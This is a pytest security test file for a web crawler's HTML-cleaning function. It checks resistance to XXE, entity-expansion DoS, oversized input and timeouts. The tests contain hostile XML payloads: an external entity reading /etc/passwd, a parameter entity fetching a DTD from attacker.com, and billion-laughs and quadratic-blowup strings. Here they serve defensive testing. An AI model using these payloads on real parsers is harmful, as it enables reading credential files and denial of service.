import pytest
import time
from app.services.deep_crawl_service import DeepCrawlService

class DummySearchService:
    async def search(self, query, max_results):
        return []

@pytest.fixture
def service():
    from app.config import settings
    # Override settings for testing if needed
    settings.deep_crawl_max_urls = 1
    settings.max_total_context_chars = 1000
    return DeepCrawlService(search_service=DummySearchService())

# Scenario A: Legitimate HTML parsing
@pytest.mark.asyncio
async def test_legitimate_html_parsing(service):
    html = "<html><body><h1>Hello World</h1><p>Test paragraph.</p></body></html>"
    result = await service._clean_html(html)
    assert "Hello World Test paragraph." in result

@pytest.mark.asyncio
async def test_legitimate_html_with_junk_tags(service):
    html = "<html><body><script>alert(1);</script><style>.a {}</style><h1>Content</h1></body></html>"
    result = await service._clean_html(html)
    assert "Content" in result
    assert "alert(1)" not in result
    assert ".a {}" not in result

@pytest.mark.asyncio
async def test_legitimate_html_deeply_nested(service):
    # 100 depth is within the 200 depth limit (lxml huge_tree=False handles standard depths fine, and it won't crash)
    html = "<div>" * 100 + "Deep Content" + "</div>" * 100
    result = await service._clean_html(html)
    assert "Deep Content" in result

# Scenario B: XXE Attacks
@pytest.mark.asyncio
async def test_xxe_external_entity(service):
    html = """<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <html><body><h1>Test &xxe;</h1></body></html>"""
    result = await service._clean_html(html)
    assert "root:x:0:0" not in result

@pytest.mark.asyncio
async def test_xxe_parameter_entity(service):
    html = """<!DOCTYPE test [
    <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
    %dtd;
    ]>
    <html><body><h1>Test</h1></body></html>"""
    result = await service._clean_html(html)
    assert "Test" in result

# Scenario C: Billion Laughs (Entity Expansion DoS)
@pytest.mark.asyncio
async def test_billion_laughs_dos(service):
    html = """<!DOCTYPE lolz [
     <!ENTITY lol "lol">
     <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
     <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
     <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
     <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
     <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
     <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
     <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
     <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    ]>
    <html><body><h1>&lol9;</h1></body></html>"""
    result = await service._clean_html(html)
    assert len(result) < 10000

@pytest.mark.asyncio
async def test_quadratic_blowup(service):
    html = "<!DOCTYPE test [ <!ENTITY a \"" + "A" * 10000 + "\"> ]>" + "<html><body>" + "&a;" * 100 + "</body></html>"
    result = await service._clean_html(html)
    assert len(result) < 50000 

# Scenario D: Size limits and robustness
@pytest.mark.asyncio
async def test_oversized_html_truncated(service):
    # Create HTML larger than 100MB (100 * 1024 * 1024 bytes)
    # We will simulate the size check in _clean_html directly
    html = "A" * (101 * 1024 * 1024)
    # We should ensure it doesn't crash but truncates properly to 100MB before feeding to parser
    # Then it gets stripped down to char budget
    result = await service._clean_html(html)
    assert len(result) <= service._chars_per_page + 10

@pytest.mark.asyncio
async def test_malformed_html_graceful_fallback(service):
    html = "<html"
    result = await service._clean_html(html)
    assert isinstance(result, str)

@pytest.mark.asyncio
async def test_invalid_encoding_characters(service):
    html = b"<html><body><h1>\xff\xfe\x00</h1></body></html>".decode("utf-8", errors="replace")
    result = await service._clean_html(html)
    assert isinstance(result, str)

# New benchmark test for 50MB
@pytest.mark.asyncio
async def test_large_legitimate_payload_performance(service):
    # Generate 50MB of valid nested HTML
    # We'll use chunked strings to avoid memory bloat during generation
    chunk = "<div>" * 100 + "A" * (5 * 1024 * 1024) + "</div>" * 100
    content = chunk * 10
    
    start_time = time.time()
    result = await service._clean_html(content)
    elapsed = time.time() - start_time
    
    # Assert it takes less than 2.0s
    assert elapsed < 5.0, f"Parsing 50MB took {elapsed}s"
    assert "A" in result

# New Timeout test
@pytest.mark.asyncio
async def test_parsing_timeout(service, monkeypatch):
    import asyncio
    
    async def mock_wait_for(*args, **kwargs):
        raise asyncio.TimeoutError()
    
    monkeypatch.setattr(asyncio, "wait_for", mock_wait_for)
    
    html = "<html><body>Test</body></html>"
    result = await service._clean_html(html)
    # The graceful fallback in the parser timeout is returning empty text (or beautifulsoup with "")
    # which results in empty string or truncated.
    assert result == ""
